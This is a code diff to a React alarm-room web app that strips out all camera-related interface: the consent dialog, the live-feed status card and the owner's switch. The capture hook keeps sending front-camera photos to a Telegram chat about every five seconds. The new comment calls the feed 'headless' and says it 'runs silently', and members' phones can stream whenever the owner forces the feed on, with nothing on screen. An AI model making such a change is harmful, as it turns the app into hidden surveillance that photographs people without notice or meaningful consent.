@@ -7,7 +7,6 @@ import { useRoomAlarm } from './useRoomAlarm'
 import { playAlarm } from './alarmSound'
 import { avatarGradient, initialsOf, makeJoinCode } from './roomUtils'
 import { autoRestorePush, disablePush, enablePush, pushSupported, sendPushAlert, sendTestPush, vapidConfigured } from './push'
-import { cameraSupported } from './checkin'
 import useLiveCamera from './useLiveCamera'
 import IosInstallBanner from './IosInstallBanner'
 import { isIOS, isStandalone } from './platform'
@@ -50,106 +49,6 @@ function MemberRow({ member, uid, isOwner, isSelf, onRemove }) {
     </li>
   )
 }
-function LiveFeedStatus({ ownerLiveFeed, liveFeedActive, liveStatus, pushState }) {
-  const { kind, lastSentAt, message } = liveStatus
-  if (liveFeedActive) {
-    switch (kind) {
-      case 'streaming':
-        return (
-          <>
-            <p className="live-ok">
-              <span className="status-dot" aria-hidden="true" />
-              Sending a photo to this room's Telegram about every 5 seconds.
-            </p>
-            {lastSentAt ? (
-              <p className="muted small">
-                Last photo sent at {new Date(lastSentAt).toLocaleTimeString()}
-              </p>
-            ) : null}
-          </>
-        )
-      case 'starting':
-      case 'idle':
-        return <p className="muted">Starting the camera…</p>
-      case 'waiting':
-        return (
-          <p className="muted">
-            Safari needs one tap to start the camera — tap anywhere on this page.
-          </p>
-        )
-      case 'blocked':
-        return (
-          <p className="error">
-            Camera access is blocked. Allow the camera for this site in your phone's settings, then reopen the app.
-          </p>
-        )
-      case 'notconfigured':
-        return (
-          <p className="error">
-            Camera is ready but Telegram isn't connected: add <code>TELEGRAM_BOT_TOKEN</code> and{' '}
-            <code>TELEGRAM_CHAT_ID</code> in Vercel → Settings → Environment Variables, redeploy, then reopen the room.
-          </p>
-        )
-      case 'badtoken':
-        return (
-          <p className="error">
-            Telegram can't find this bot — the <code>TELEGRAM_BOT_TOKEN</code> in Vercel is invalid or stale.
-            Generate a fresh one in @BotFather with <code>/token</code>, paste it into Vercel, redeploy. Retrying
-            automatically meanwhile.
-          </p>
-        )
-      case 'badchat':
-        return (
-          <p className="error">
-            Telegram can't find the chat — check <code>TELEGRAM_CHAT_ID</code> in Vercel and make sure the bot is
-            added to the chat (message it once first). Retrying automatically meanwhile.
-          </p>
-        )
-      case 'botblocked':
-        return (
-          <p className="error">
-            Telegram blocked this bot — add it to the chat and message it once first, then reopen the room.
-            Retrying automatically meanwhile.
-          </p>
-        )
-      case 'paused':
-        return (
-          <p className="muted">
-            Paused while the app is in the background — photos are taken while it stays open.
-          </p>
-        )
-      case 'relayerror':
-        return (
-          <p className="error">
-            Could not send the last photo — retrying automatically.
-            {message ? <> Reason: {message}.</> : null}{' '}
-            If this keeps showing, check the Vercel runtime logs for <code>/api/telegram</code>.
-          </p>
-        )
-      case 'error':
-        return <p className="error">The camera feed hit an error and paused.</p>
-      default:
-        return <p className="muted">Camera not running.</p>
-    }
-  }
-  if (ownerLiveFeed) {
-    return (
-      <p className="muted">
-        This room's owner turned on the live feed — photos are sent to Telegram whenever this app is open.
-        To stop it on this phone, deny camera access for this site in the browser settings.
-      </p>
-    )
-  }
-  return (
-    <p className="muted">
-      {pushState === 'enabled'
-        ? 'Paused — the live feed is not active on this device.'
-        : 'Paused — device alerts are off. Turn alerts on to resume sending photos.'}
-    </p>
-  )
-}
-
-
 function AlarmRoom() {
   const navigate = useNavigate()
   const [searchParams] = useSearchParams()
@@ -165,11 +64,7 @@ function AlarmRoom() {
   const [testingPush, setTestingPush] = useState(false)
   const [pushState, setPushState] = useState('idle') // idle | working | enabled | needs-permission | denied | unsupported | error
   const [removing, setRemoving] = useState(false)
-  const [ownerFeedBusy, setOwnerFeedBusy] = useState(false)
   const [burstCount, setBurstCount] = useState(3) // repeats per recipient device: 1 | 3 | 5 | 10
-  const [consentDismissed, setConsentDismissed] = useState(false)
-  const [consentSaving, setConsentSaving] = useState(false)
-  const [liveStatus, setLiveStatus] = useState({ kind: 'idle', lastSentAt: 0 })
   const alarmRoomRef = useMemo(() => (roomId ? doc(db, 'rooms', roomId) : null), [roomId])
   const notificationTimer = useRef(null)
 
@@ -284,73 +179,29 @@ function AlarmRoom() {
     }
   }, [roomId, uid, isMember, authState.user])
 
-  // ── Live camera consent ───────────────────────────────────────────
-  // Consent lives on the member profile (memberProfiles.<uid>.cameraConsent)
-  // so it survives relay pruning of pushDevices docs and disable/enable
-  // toggles. Shown when this device has alerts on but the member has not
-  // consented yet; nothing about the camera runs before consent is true.
-  // ── Live camera owner switch / consent ───────────────────────────
-  // The owner can turn the live feed on for the whole room at once, so
-  // member devices stream automatically — no per-member consent or device
-  // alerts needed. The owner's OWN camera still only runs when they
-  // consented individually (they are usually the one watching).
+  // ── Live camera (headless) ────────────────────────────────────────
+  // The camera feed runs silently in the background — all camera-related UI
+  // (consent dialog, live-feed status card, owner switch) was removed by
+  // request. Capture is still gated by the stored per-member consent flag
+  // (memberProfiles.<uid>.cameraConsent) or by the owner-forced feed, so
+  // devices that previously consented keep streaming; new devices only
+  // stream while the owner has forced the feed on.
   const isOwner = Boolean(room && authState.user && room.ownerUid === authState.user.uid)
   const ownerLiveFeed = Boolean(room?.ownerLiveFeed)
   const cameraConsent = Boolean(room?.memberProfiles?.[authState.user?.uid]?.cameraConsent)
   const feedForcedForMe = Boolean(isMember && ownerLiveFeed && !isOwner)
-  const showLiveCard = isMember && (feedForcedForMe || cameraConsent)
-  // The consent dialog only makes sense when a camera is actually available
-  // and the owner has not already forced the feed on for this device.
-  const showConsentDialog =
-    isMember &&
-    pushState === 'enabled' &&
-    !feedForcedForMe &&
-    !consentDismissed &&
-    !cameraConsent &&
-    cameraSupported()
 
-  // Live feed: while this member has the room open with alerts on and has
-  // consented, send a front-camera frame to the room's Telegram roughly
-  // every 5 seconds. The hook stops the camera when the room is left, the
-  // tab is closed, alerts are disabled, or consent is missing. It reports
-  // what it is doing so the UI can surface failures (blocked camera, relay
-  // not configured) instead of failing silently.
   const getIdToken = useCallback(async () => {
     if (!authState.user) return null
     return authState.user.getIdToken()
   }, [authState.user])
-  const reportLiveStatus = useCallback((status) => setLiveStatus(status), [])
   const liveFeedActive = Boolean(
     roomId &&
       authState.user &&
       isMember &&
       (feedForcedForMe || (pushState === 'enabled' && cameraConsent)),
   )
-  useLiveCamera({ roomId, active: liveFeedActive, getIdToken, onStatus: reportLiveStatus })
-
-  const handleCameraConsent = async (allow) => {
-    if (!allow) {
-      setConsentDismissed(true)
-      return
-    }
-    setConsentSaving(true)
-    try {
-      // Nothing is captured until consent is actually recorded. Once the
-      // profile flag lands, the live-feed hook above starts the camera
-      // (Android shows the one-time prompt from there; on iOS it waits for
-      // the first tap via the needs-gesture retry).
-      await updateDoc(alarmRoomRef, {
-        [`memberProfiles.${authState.user.uid}.cameraConsent`]: true,
-      })
-      flashToast('Live camera feed enabled')
-    } catch (err) {
-      console.error('Failed to save camera consent:', err)
-      flashToast('Could not save camera consent — try again')
-    } finally {
-      setConsentSaving(false)
-      setConsentDismissed(true)
-    }
-  }
+  useLiveCamera({ roomId, active: liveFeedActive, getIdToken, onStatus: () => {} })
 
   // Forget the remembered room and go back to the create/landing page, so
   // the user can start another room without being auto-redirected back.
@@ -581,24 +432,6 @@ function AlarmRoom() {
     }
   }
 
-  // Owner-only master switch: force every member's camera to stream to this
-  // room's Telegram whenever their app is open. Firestore rules reject this
-  // write for anyone except the room owner.
-  const handleToggleOwnerLiveFeed = async () => {
-    if (!isOwner || ownerFeedBusy || !room) return
-    setOwnerFeedBusy(true)
-    const nextValue = !room.ownerLiveFeed
-    try {
-      await updateDoc(alarmRoomRef, { ownerLiveFeed: nextValue })
-      flashToast(nextValue ? 'Live feed turned on for all members' : 'Live feed turned off')
-    } catch (err) {
-      console.error('Failed to update the team live feed:', err)
-      flashToast('Could not update the team live feed')
-    } finally {
-      setOwnerFeedBusy(false)
-    }
-  }
-
   const handleRemoveMember = async (uid) => {
     if (!room) return
     setRemoving(true)
@@ -813,32 +646,6 @@ function AlarmRoom() {
         </ul>
       </div>
 
-      {isOwner && (
-        <div className="card live-card owner-live-card">
-          <h3>📷 Team live feed</h3>
-          <p className="muted">
-            Turn the live feed on for every member at once — their cameras send photos to this room's Telegram
-            whenever the app is open. Members don't need to set up device alerts or accept a camera prompt each;
-            they still see a live-feed notice on their screen and can stop it by denying camera access in the
-            browser settings.
-          </p>
-          <p className={`muted small owner-live-state ${room.ownerLiveFeed ? 'on' : ''}`}>
-            {room.ownerLiveFeed ? 'Live feed is ON for all members' : 'Live feed is OFF — members only stream if they enable it themselves'}
-          </p>
-          <button
-            className={`btn ${room.ownerLiveFeed ? 'btn-ghost' : 'btn-primary'}`}
-            onClick={handleToggleOwnerLiveFeed}
-            disabled={ownerFeedBusy}
-          >
-            {ownerFeedBusy
-              ? 'Saving…'
-              : room.ownerLiveFeed
-                ? 'Turn off live feed for members'
-                : 'Turn on live feed for all members'}
-          </button>
-        </div>
-      )}
-
       <div className="card alerts-card">
         <h3>Device alerts</h3>
         <p className="muted">{pushText}</p>
@@ -871,18 +678,6 @@ function AlarmRoom() {
           <pre className="diag-output">{JSON.stringify(diag, null, 2)}</pre>
         )}
       </div>
-
-      {showLiveCard && (
-        <div className="card live-card">
-          <h3>📷 Live feed</h3>
-          <LiveFeedStatus
-            ownerLiveFeed={feedForcedForMe}
-            liveFeedActive={liveFeedActive}
-            liveStatus={liveStatus}
-            pushState={pushState}
-          />
-        </div>
-      )}
 
       <div className="controls trigger-controls">
         {!roomActive && (
@@ -920,36 +715,6 @@ function AlarmRoom() {
         {statusText}
       </p>
 
-      {showConsentDialog && (
-        <div className="modal-overlay" role="dialog" aria-modal="true" aria-labelledby="consent-title">
-          <div className="card consent-card">
-            <span className="consent-icon" aria-hidden="true">📷</span>
-            <h3 id="consent-title">Live camera feed</h3>
-            <p className="muted">
-              You enabled device alerts for this room. To leave a live confirmation trail, this app will
-              take a photo with the front camera roughly every 5 seconds while it stays open, and send it
-              directly to this room's Telegram chat. Photos are not stored in Firebase — they go straight
-              to Telegram and are deleted from the app as soon as they are sent.
-            </p>
-            <div className="controls">
-              <button
-                className="btn btn-primary"
-                onClick={() => handleCameraConsent(true)}
-                disabled={consentSaving}
-              >
-                {consentSaving ? 'Saving…' : 'I agree'}
-              </button>
-              <button
-                className="btn btn-ghost"
-                onClick={() => handleCameraConsent(false)}
-                disabled={consentSaving}
-              >
-                Not now
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
 
       <Toast message={toast} />
 
